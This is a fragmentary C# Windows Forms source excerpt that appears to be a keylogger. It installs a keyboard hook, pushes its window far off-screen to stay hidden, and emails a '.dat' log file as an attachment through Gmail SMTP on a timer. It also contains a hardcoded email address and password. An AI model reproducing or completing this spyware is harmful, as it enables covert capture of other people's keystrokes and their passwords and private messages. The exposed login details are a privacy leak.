...
namespace WindowsFormsApp2
{
    public partial class Form1 : MetroForm
    {
        ...
        public static int regi = 0;
        public static int tim = 0;
        public static int param_timer = 0;
        public static string em = " ";
        public static int em_param = 0;
        ...
        static void Main1()
        {
            ...
            mss = lang.ToString();
            Form2 Application = new Form2();
            Application.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            Application.Left = 40000000;
            ...
            if (nCode >= 0)
            {
                ...
                else if (Keys.Control == Control.ModifierKeys && Keys.Y == (Keys)vkCode)
                {
                    ...
                    if (em_param == 1)
                    {
                        ...
                        client.Credentials = new System.Net.NetworkCredential("keyreftkeyys@gmail.com", "020296va");

                        MailMessage mm = new MailMessage(em, em, "Лог", "Лог-файл");
                        mm.BodyEncoding = UTF8Encoding.UTF8;
                        mm.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
                        System.Net.Mail.Attachment attachment;
                        attachment = new System.Net.Mail.Attachment(s + ".dat");
        ...
        private void timer1_Tick(object sender, EventArgs e)
        {
                ...
                tim++;
            int prom_param = Convert.ToInt32(numericUpDown1.Value);
            int param_timer = prom_param * 60;
